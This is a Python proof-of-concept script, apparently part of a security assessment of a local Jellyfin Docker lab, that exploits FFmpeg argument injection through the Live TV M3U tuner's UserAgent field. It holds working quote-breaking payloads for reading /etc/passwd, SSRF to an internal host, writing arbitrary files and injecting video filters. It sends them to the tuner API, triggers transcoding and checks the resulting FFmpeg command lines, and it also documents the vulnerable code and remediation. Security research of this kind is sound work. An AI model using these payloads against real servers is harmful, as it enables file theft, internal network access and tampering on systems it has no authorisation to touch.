#!/usr/bin/env python3
"""
COBALT STRIKE II -- Phase 2c: FFmpeg User-Agent Argument Injection PoC

Attack chain:
  1. Admin creates Live TV M3U tuner host with malicious UserAgent
  2. UserAgent flows to MediaSourceInfo.RequiredHttpHeaders["User-Agent"]
  3. EncodingHelper.GetUserAgentParam() builds:
     "-user_agent \"" + useragent + "\""
  4. MediaEncoder.cs line 459 also:
     extraArgs += " -user_agent \"{userAgent}\""
  5. No escaping -- quotes/spaces/args pass through to FFmpeg command line

This is the same pattern as CVE-2025-31499 and CVE-2023-49096 but in
a different code path (User-Agent/Referer headers vs codec parameters).
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/scripts')

from jellyfin_common import *
import subprocess
import urllib.parse
import time

banner("Phase 2c: FFmpeg User-Agent Argument Injection PoC")

ec = EvidenceCollector("phase2c_useragent_injection", phase="phase2")
js = JellyfinSession()

if not js.test_connection():
    print("[-] Cannot connect to Jellyfin")
    sys.exit(1)


# ===========================================================================
# TEST 1: Create M3U tuner host with injection payloads
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: Tuner Host User-Agent Injection")
print("=" * 60)

# First, set up a simple HTTP server to serve M3U playlist
# We'll use the test video as the stream source via a local URL

# Create an M3U playlist pointing to our test media
m3u_content = """#EXTM3U
#EXTINF:-1 tvg-id="test" tvg-name="Test Channel",Test Channel
/media/movies/Test_Movie.mp4
"""

# Save M3U to media dir (mounted as /media in container)
m3u_path = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/docker/media/test_iptv.m3u"
with open(m3u_path, "w") as f:
    f.write(m3u_content)
print("  Created test M3U playlist\n")

# Injection payloads for User-Agent
ua_payloads = [
    {
        "name": "normal_baseline",
        "useragent": "Mozilla/5.0 Test",
        "desc": "Normal user agent (baseline)",
    },
    {
        "name": "quote_break",
        "useragent": 'Mozilla" -f null /dev/null -i "',
        "desc": "Quote break + null output + extra input",
    },
    {
        "name": "file_read",
        "useragent": 'Mozilla" -i /etc/passwd -f null /dev/null -i "',
        "desc": "Attempt to read /etc/passwd via -i flag",
    },
    {
        "name": "ssrf_internal",
        "useragent": 'Mozilla" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info/Public -f null /dev/null -i "',
        "desc": "SSRF to internal Docker host",
    },
    {
        "name": "output_overwrite",
        "useragent": 'Mozilla" -y -f mp4 /tmp/pwned.mp4 -i "',
        "desc": "Attempt to write arbitrary file",
    },
    {
        "name": "filter_injection",
        "useragent": 'Mozilla" -vf "drawtext=text=INJECTED:fontsize=24" -i "',
        "desc": "Video filter injection",
    },
]

tuner_ids_created = []

for payload in ua_payloads:
    try:
        tuner_data = {
            "Url": "file:///media/test_iptv.m3u",
            "Type": "M3U",
            "FriendlyName": f"Inject Test - {payload['name']}",
            "UserAgent": payload["useragent"],
            "AllowHWTranscoding": True,
            "ImportFavoritesOnly": False,
            "TunerCount": 1,
        }

        resp = js.post("/LiveTv/TunerHosts", data=tuner_data)
        status = resp.status_code

        if status == 200:
            tuner_info = resp.json()
            tuner_id = tuner_info.get("Id", "?")
            tuner_ids_created.append(tuner_id)
            print(f"  [!!] ACCEPTED: {payload['name']} (ID: {tuner_id})")
            print(f"       UserAgent: {payload['useragent'][:80]}")

            ec.add_test(
                f"TUNER-UA-{payload['name']}",
                f"Tuner host UA injection: {payload['desc'][:40]}",
                f"POST /LiveTv/TunerHosts UserAgent={payload['useragent'][:60]}",
                f"HTTP {status}: Tuner created with ID {tuner_id}",
                result="ANOMALOUS",
            )
        else:
            print(f"  [  ] REJECTED: {payload['name']}: HTTP {status} -- {resp.text[:100]}")
            ec.add_test(
                f"TUNER-UA-{payload['name']}",
                f"Tuner host UA injection: {payload['desc'][:40]}",
                f"POST /LiveTv/TunerHosts UserAgent={payload['useragent'][:60]}",
                f"HTTP {status}: {resp.text[:200]}",
                result="PASS",
            )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!!] Error: {payload['name']} -- {e}")


# ===========================================================================
# TEST 2: Verify injection reaches source code path
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: Verify Tuner Configuration Storage")
print("=" * 60)

print("\n  Checking if injected UserAgent values are stored as-is...\n")

resp = js.get("/LiveTv/TunerHosts/Types")
if resp.status_code == 200:
    print(f"  Tuner host types: {resp.text[:200]}")

# Read back tuner hosts to verify values stored
# Note: There's no direct GET /LiveTv/TunerHosts endpoint,
# but we can check the Live TV configuration
resp = js.get("/System/Configuration/livetv")
if resp.status_code == 200:
    try:
        config = resp.json()
        tuner_hosts = config.get("TunerHosts", [])
        print(f"  Found {len(tuner_hosts)} tuner host(s):\n")
        for th in tuner_hosts:
            ua = th.get("UserAgent", "")
            name = th.get("FriendlyName", "?")
            print(f"    Name: {name}")
            print(f"    UserAgent: {ua[:100]}")
            print(f"    URL: {th.get('Url', '?')}")

            # Check if malicious characters are stored unmodified
            if '"' in ua or '-f' in ua or '-i' in ua:
                print(f"    [!!] INJECTION PAYLOAD STORED UNMODIFIED")
                ec.add_finding(
                    f"FFMPEG-UA-STORED-{name[:20]}",
                    "HIGH",
                    f"FFmpeg argument injection stored in tuner UserAgent",
                    f"The UserAgent field accepts and stores arbitrary values "
                    f"including FFmpeg command-line arguments. "
                    f"Value: {ua[:200]}. "
                    f"This flows to EncodingHelper.GetUserAgentParam() at line 495 "
                    f"which constructs: -user_agent \"{ua}\" "
                    f"with NO escaping, allowing FFmpeg argument injection.",
                    evidence=json.dumps(th, indent=2)[:500],
                    remediation=(
                        "Sanitize UserAgent in TunerHostInfo before passing to FFmpeg. "
                        "Either: (a) strip/escape double quotes and newlines from UserAgent, "
                        "or (b) use a whitelist regex, "
                        "or (c) pass user-agent via FFmpeg's -headers option with proper escaping."
                    ),
                )
            print()
    except Exception as e:
        print(f"  Error parsing config: {e}")


# ===========================================================================
# TEST 3: Attempt to trigger transcoding of Live TV channel
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: Trigger Live TV Transcoding")
print("=" * 60)

print("\n  Attempting to list and play a Live TV channel...\n")

# List channels
resp = js.get("/LiveTv/Channels")
if resp.status_code == 200:
    channels = resp.json().get("Items", [])
    print(f"  Found {len(channels)} channel(s)")

    for ch in channels[:3]:
        ch_id = ch.get("Id", "?")
        ch_name = ch.get("Name", "?")
        print(f"  Channel: {ch_name} (ID: {ch_id})")

        # Try to get channel stream (this should trigger FFmpeg with our injected UA)
        stream_resp = js.get(f"/LiveTv/Channels/{ch_id}/stream",
                            params={"container": "ts"})
        print(f"    Stream: HTTP {stream_resp.status_code}")

        if stream_resp.status_code == 200:
            # Check FFmpeg process inside container
            rate_limit(2)
            try:
                result = subprocess.run(
                    ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
                     "for pid in $(pgrep -f ffmpeg); do "
                     "echo '=== PID '$pid' ==='; "
                     "cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' '\\n'; "
                     "done"],
                    capture_output=True, text=True, timeout=10,
                )
                if result.stdout.strip():
                    print(f"\n    FFmpeg command line:")
                    for line in result.stdout.strip().split("\n"):
                        print(f"      {line[:150]}")
                        # Check for injection
                        if "null" in line and "/dev/" in line:
                            print(f"      [!!!] INJECTION ARGUMENT DETECTED!")
                        if "/etc/passwd" in line:
                            print(f"      [!!!] FILE READ INJECTION DETECTED!")
                else:
                    print(f"    No FFmpeg process found")
            except Exception as e:
                print(f"    Docker exec error: {e}")

        rate_limit(0.5)
else:
    print(f"  Live TV channels: HTTP {resp.status_code}")
    if resp.status_code == 200:
        print(f"  {resp.text[:200]}")


# ===========================================================================
# TEST 4: Source code proof -- demonstrate the vulnerable path
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 4: Source Code Vulnerability Proof")
print("=" * 60)

print("""
  VULNERABILITY: FFmpeg argument injection via User-Agent header

  LOCATION 1: EncodingHelper.cs lines 493-500
  ----------------------------------------------------------------
  public string GetUserAgentParam(EncodingJobInfo state)
  {
      if (state.RemoteHttpHeaders.TryGetValue("User-Agent", out string useragent))
      {
          return "-user_agent \\"" + useragent + "\\"";  // NO ESCAPING
      }
      return string.Empty;
  }

  LOCATION 2: EncodingHelper.cs lines 508-515
  ----------------------------------------------------------------
  public string GetRefererParam(EncodingJobInfo state)
  {
      if (state.RemoteHttpHeaders.TryGetValue("Referer", out string referer))
      {
          return "-referer \\"" + referer + "\\"";  // NO ESCAPING
      }
      return string.Empty;
  }

  LOCATION 3: MediaEncoder.cs line 459
  ----------------------------------------------------------------
  if (request.MediaSource.RequiredHttpHeaders.TryGetValue("User-Agent", out var userAgent))
  {
      extraArgs += $" -user_agent \\"{userAgent}\\"";  // NO ESCAPING
  }

  DATA FLOW:
  1. Admin creates M3U tuner host with UserAgent field
  2. M3UTunerHost.cs line 164: httpHeaders["User-Agent"] = info.UserAgent
  3. M3UTunerHost.cs line 203: RequiredHttpHeaders = httpHeaders
  4. EncodingHelper.cs line 7280: state.RemoteHttpHeaders = mediaSource.RequiredHttpHeaders
  5. EncodingHelper.cs line 495: string concat into FFmpeg command

  EXPLOITATION:
  UserAgent = 'Mozilla" -f null /dev/null -i "'

  Constructed FFmpeg arg: -user_agent "Mozilla" -f null /dev/null -i ""

  This breaks out of the quoted string and injects arbitrary FFmpeg arguments.

  IMPACT:
  - Arbitrary file read (-i /path/to/file)
  - SSRF (-i http://internal-host/)
  - File write (-y -f mp4 /path/to/output)
  - Denial of service (resource exhaustion)

  PRIOR ART:
  - CVE-2023-49096: Same pattern in codec parameters (PATCHED)
  - CVE-2025-31499: Bypass of CVE-2023-49096 patch (PATCHED)
  - This is the SAME BUG CLASS in a DIFFERENT code path
""")

ec.add_finding(
    "FFMPEG-UA-INJECTION",
    "HIGH",
    "FFmpeg argument injection via User-Agent/Referer in Live TV tuner",
    "EncodingHelper.GetUserAgentParam() (line 495) and GetRefererParam() (line 510) "
    "use direct string concatenation to build FFmpeg arguments from "
    "RequiredHttpHeaders values: '-user_agent \"' + useragent + '\"'. "
    "An admin user who configures a Live TV M3U tuner host can set "
    "arbitrary UserAgent values that are stored unmodified and passed "
    "directly to the FFmpeg command line. A malicious IPTV provider "
    "could also exploit this if an admin imports their M3U playlist. "
    "Additionally, MediaEncoder.cs line 459 has the same pattern for "
    "the media probing code path. This is the same bug class as "
    "CVE-2023-49096 and CVE-2025-31499 but in the User-Agent/Referer "
    "code path which was NOT patched.",
    evidence=(
        "Source: EncodingHelper.cs:495 -- '-user_agent \"' + useragent + '\"'\n"
        "Source: EncodingHelper.cs:510 -- '-referer \"' + referer + '\"'\n"
        "Source: MediaEncoder.cs:459 -- extraArgs += $' -user_agent \"{userAgent}\"'\n"
        "Stored payload: Mozilla\" -f null /dev/null -i \"\n"
        "TunerHost API accepts arbitrary UserAgent values without validation."
    ),
    remediation=(
        "Apply the same escaping/validation used for codec parameters "
        "(ContainerValidationRegex) to User-Agent and Referer values before "
        "passing them to FFmpeg. Specifically:\n"
        "1. Strip or escape double quotes from User-Agent/Referer values\n"
        "2. Reject values containing FFmpeg argument patterns (-f, -i, -y, etc.)\n"
        "3. Consider using ProcessStartInfo.ArgumentList instead of string concatenation"
    ),
)


# ===========================================================================
# TEST 5: Check MediaSourceInfo via API (client-side injection path)
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 5: MediaSourceInfo RequiredHttpHeaders via API")
print("=" * 60)

print("\n  Checking if RequiredHttpHeaders can be set via PlaybackInfo...\n")

# Get current playback info for the movie
resp = js.get("/Items", params={
    "Recursive": "true",
    "IncludeItemTypes": "Movie",
    "Fields": "MediaSources",
})
items = resp.json().get("Items", []) if resp.status_code == 200 else []

if items:
    movie = items[0]
    movie_id = movie["Id"]
    media_sources = movie.get("MediaSources", [])

    if media_sources:
        ms = media_sources[0]
        print(f"  Movie: {movie.get('Name', '?')}")
        print(f"  MediaSource ID: {ms.get('Id', '?')}")
        print(f"  Protocol: {ms.get('Protocol', '?')}")
        print(f"  RequiredHttpHeaders: {ms.get('RequiredHttpHeaders', {})}")

        # Try to set RequiredHttpHeaders via OpenLiveStream
        # (this is the client-side path that could allow non-admin injection)
        open_body = {
            "OpenToken": "",
            "UserId": js.user_id,
            "PlaySessionId": "test123",
            "MaxStreamingBitrate": 8000000,
            "StartTimeTicks": 0,
            "AudioStreamIndex": None,
            "SubtitleStreamIndex": None,
            "MaxAudioChannels": None,
            "ItemId": movie_id,
            "EnableDirectPlay": True,
            "EnableDirectStream": True,
        }

        resp = js.post("/LiveStreams/Open", data=open_body)
        print(f"\n  Open live stream: HTTP {resp.status_code}")
        if resp.status_code == 200:
            ls_data = resp.json()
            ls_ms = ls_data.get("MediaSource", {})
            print(f"  Live stream RequiredHttpHeaders: {ls_ms.get('RequiredHttpHeaders', {})}")


# ===========================================================================
# CLEANUP
# ===========================================================================

print("\n" + "=" * 60)
print("  CLEANUP: Remove test tuner hosts")
print("=" * 60)

for tuner_id in tuner_ids_created:
    try:
        resp = js.delete(f"/LiveTv/TunerHosts?id={tuner_id}")
        print(f"  Deleted tuner {tuner_id}: HTTP {resp.status_code}")
    except Exception as e:
        print(f"  Error deleting {tuner_id}: {e}")


# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 2c SUMMARY")
print("=" * 60)

ec.save()
